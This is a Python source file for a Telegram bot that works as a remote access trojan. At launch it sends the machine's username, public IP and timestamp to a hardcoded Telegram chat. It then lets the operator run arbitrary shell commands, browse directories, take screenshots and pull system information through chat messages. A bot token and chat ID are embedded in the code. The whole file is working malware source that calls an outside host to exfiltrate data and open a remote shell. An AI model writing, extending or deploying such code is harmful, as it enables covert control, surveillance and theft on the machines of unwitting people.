import os
import subprocess
import httpx
import logging
import requests
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

# Optional screenshot & system info
from payloads.scrcap import capture_screen
from payloads.info import get_all_system_info

BOT_TOKEN = "7843150896:AAHpay0sUjwT2rclZ77PeO4yVRZLtbnb9nE"

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Global current working directory
cwd = os.getcwd()

# Helper: Send large message in chunks
async def send_large_message(update, message):
    max_length = 4096
    for i in range(0, len(message), max_length):
        await update.message.reply_text(message[i:i + max_length])

# /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info(f"/start used by {update.effective_user.username}")
    await update.message.reply_text("Hello! I'm your bot. Type /help to see what I can do.")

# /help command
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info(f"/help used by {update.effective_user.username}")
    await update.message.reply_text(
        "Available commands:\n"
        "/start - Welcome message\n"
        "/help - Show this help\n"
        "cmd <command> - Run system command\n"
        "scrcap - Capture screen\n"
        "info - Get system info\n"
    )

# Message handler
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global cwd
    msg = update.message.text.strip()
    user = update.effective_user.username or update.effective_user.first_name
    logger.info(f"Received from {user}: {msg}")

    try:
        if msg.lower() == "hi":
            await update.message.reply_text("Hello there, friend!")
        elif msg.lower() == "bye":
            await update.message.reply_text("Goodbye or see ya 👋")
        elif msg.lower() == "use":
            await update.message.reply_text("I'm just a test bot 🤖")
        elif msg.lower() == "info":
            logger.info(f"{user} requested system info")
            info = get_all_system_info()
            await send_large_message(update, info)
        elif msg.lower() == "scrcap":
            logger.info(f"{user} requested screenshot")
            try:
                path, name = capture_screen()
                await update.message.reply_text("Here is your screen capture 👇")
                with open(path, "rb") as f:
                    await update.message.reply_photo(f)
            except Exception as e:
                logger.error(f"Screenshot error: {e}")
                await update.message.reply_text(f"[!] Screenshot failed: {e}")
        elif msg.lower().startswith("cmd "):
            cmd = msg[4:].strip()
            logger.info(f"{user} command: {cmd}")
            if cmd.lower().startswith("cd "):
                path = cmd[3:].strip().strip('"')
                new_path = os.path.abspath(os.path.join(cwd, path))
                if os.path.isdir(new_path):
                    cwd = new_path
                    await update.message.reply_text(f"Changed directory to: {cwd}")
                else:
                    await update.message.reply_text(f"[-] Directory not found: {path}")
            else:
                try:
                    result = subprocess.run(
                        cmd,
                        shell=True,
                        cwd=cwd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    output = result.stdout.strip() or "[+] Done with no output."
                    error = result.stderr.strip()
                    final = output + ("\n[!] " + error if error else "")
                    await send_large_message(update, final)
                except Exception as e:
                    logger.error(f"Command error: {e}")
                    await update.message.reply_text(f"[!] Error: {e}")
        else:
            await update.message.reply_text("I don't understand that. Try /help")
    except Exception as e:
        logger.exception("Unexpected error")
        await update.message.reply_text(f"[!] Something went wrong: {e}")

# Bot startup function
def main():
    logger.info("Starting bot...")

    # ⬇ Send PC info on startup using requests (replaces old async job)
    try:
        pc_username = os.getlogin()
        public_ip = requests.get("https://api.ipify.org?format=json").json().get("ip", "No IP")
        current_date = datetime.now().strftime("%b %d, %Y %I:%M:%S %p")
        TEXT = f"{pc_username} {public_ip} {current_date}"

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": "5441972884",
            "text": TEXT
        }
        r = requests.post(url, data=payload)
        print(f"Startup message sent: {r.json()}")
    except Exception as e:
        print(f"[!] Failed to send startup message: {e}")

    # Start bot app
    app = Application.builder().token(BOT_TOKEN).build()

    # Handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    logger.info("Bot is now polling")
    app.run_polling()

if __name__ == "__main__":
    main()
